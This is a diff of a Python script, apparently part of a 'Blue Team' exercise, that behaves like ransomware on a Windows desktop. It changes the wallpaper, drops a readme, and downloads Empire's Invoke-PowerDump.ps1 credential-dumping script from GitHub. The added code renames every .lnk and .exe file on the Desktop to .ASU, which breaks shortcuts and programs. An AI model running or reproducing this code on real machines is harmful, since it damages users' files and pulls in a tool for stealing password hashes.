@@ -124,28 +124,15 @@ Blue Team Privy
         print(f"Error: {e}")
 
 # Change icon in Desktop
-def change_shortcut_extension(desktop_directory, old_extension, new_extension):
+def change_extension_on_desktop(old_extension, new_extension):
+    desktop_directory = os.path.join(os.path.expanduser("~"), "Desktop")
 
-    try:
-        # Ensure the Desktop directory exists
-        if not os.path.exists(desktop_directory):
-            print(f"Desktop directory not found: {desktop_directory}")
-            return
-
-        # List files on the desktop
-        files = [f for f in os.listdir(desktop_directory) if os.path.isfile(os.path.join(desktop_directory, f))]
-
-        # Rename shortcut files with the old extension to have the new extension
-        for file_name in files:
-            if file_name.lower().endswith(old_extension.lower()):
-                old_path = os.path.join(desktop_directory, file_name)
-                new_path = os.path.join(desktop_directory, f"{os.path.splitext(file_name)[0]}.{new_extension}")
-
-                shutil.move(old_path, new_path)
-                print(f"Renamed {file_name} to {os.path.basename(new_path)}")
-
-    except Exception as e:
-        print(f"Error: {e}")
+    for filename in os.listdir(desktop_directory):
+        if filename.endswith(old_extension):
+            old_filepath = os.path.join(desktop_directory, filename)
+            new_filepath = os.path.join(desktop_directory, filename.rsplit('.', 1)[0] + new_extension)
+            os.rename(old_filepath, new_filepath)
+            print(f"Changed {old_filepath} to {new_filepath}")
 
 # Open readme.txt
 def open_readme_on_desktop():
@@ -213,10 +200,6 @@ if __name__ == "__main__":
     # Path directory
     desktop_directory = os.path.join(os.path.expanduser("~"), "Desktop")
     
-    # New extention
-    old_extension = ".lnk"  # Change to your desired old extension
-    new_extension = "ASU"   # Change to your desired new extension
-    
     # PowerDump
     powerDump_url = "https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-PowerDump.ps1"
     script_name = "Invoke-PowerDump.ps1"
@@ -233,8 +216,11 @@ if __name__ == "__main__":
     # Change the wallpaper using the downloaded file
     change_wallpaper(download_path)
 
-    # Call the function to change shortcut extensions
-    change_shortcut_extension(desktop_directory, old_extension, new_extension)
+    # Change extension from .lnk to .ASU on the desktop
+    change_extension_on_desktop(".lnk", ".ASU")
+
+    # Change extension from .exe to .ASU on the desktop
+    change_extension_on_desktop(".exe", ".ASU")
 
     # Call the function to add README text
     add_readme(file_path)
